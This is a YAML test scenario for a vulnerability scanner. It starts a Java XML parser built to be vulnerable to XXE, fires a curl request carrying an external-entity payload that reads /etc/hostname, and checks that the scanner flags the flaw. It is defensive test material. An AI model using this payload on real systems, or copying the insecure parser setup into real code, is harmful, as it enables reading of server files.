name: xxe-java-parser
description: "Real Java XML parser with XXE enabled (DocumentBuilderFactory without entity disabling) — beacon xxe scanner detects external entity injection"
tags: [xxe, scanner, web, authorized, java]

services:
  xxe-app:
    build:
      context: ./xxe
      dockerfile: Dockerfile
    ports: ["9221:8080"]

ready:
  cmd: "curl -sf http://localhost:9221/health >/dev/null"
  timeout: 60s
  interval: 3s

assertions:
  - name: exploit-xxe-file-read
    type: command
    expect:
      command: "curl -sf -X POST http://localhost:9221/parse -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><root>&xxe;</root>' | grep -qE '.+'"
      exit_code: 0

  - name: detects-xxe
    type: beacon
    target: localhost:9221
    args: ["--no-enrich", "--scanners", "xxe", "--deep", "--permission-confirmed", "--authorized", "--ports", "8080"]
    expect:
      check_id: web.xxe

timeout: 5m
